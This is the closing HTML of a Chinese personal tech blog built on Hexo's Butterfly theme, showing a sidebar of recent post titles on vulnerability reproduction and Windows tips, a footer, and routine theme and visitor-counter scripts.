title="CVE-2021-42278 &amp; CVE-2021-42287 域提权"><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290947683.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2021-42278 &amp; CVE-2021-42287 域提权"/></a><div class="content"><a class="title" href="/articles/8e808fd4/" title="CVE-2021-42278 &amp; CVE-2021-42287 域提权">CVE-2021-42278 &amp; CVE-2021-42287 域提权</a><time datetime="2021-12-29T12:35:08.000Z" title="发表于 2021-12-29 20:35:08">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/articles/de574863/" title="CVE-2019-5736-Docker逃逸RunC漏洞复现"><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290919387.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2019-5736-Docker逃逸RunC漏洞复现"/></a><div class="content"><a class="title" href="/articles/de574863/" title="CVE-2019-5736-Docker逃逸RunC漏洞复现">CVE-2019-5736-Docker逃逸RunC漏洞复现</a><time datetime="2021-12-29T01:12:36.000Z" title="发表于 2021-12-29 09:12:36">2021-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/articles/602d9e2a/" title="fastjson漏洞复现"><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290953605.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fastjson漏洞复现"/></a><div class="content"><a class="title" href="/articles/602d9e2a/" title="fastjson漏洞复现">fastjson漏洞复现</a><time datetime="2021-12-03T12:35:08.000Z" title="发表于 2021-12-03 20:35:08">2021-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/articles/c63c4f59/" title="Windows10更改用户名方式"><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112291001124.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows10更改用户名方式"/></a><div class="content"><a class="title" href="/articles/c63c4f59/" title="Windows10更改用户名方式">Windows10更改用户名方式</a><time datetime="2021-12-03T12:35:08.000Z" title="发表于 2021-12-03 20:35:08">2021-12-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By ThesYu</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to syyu's Blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
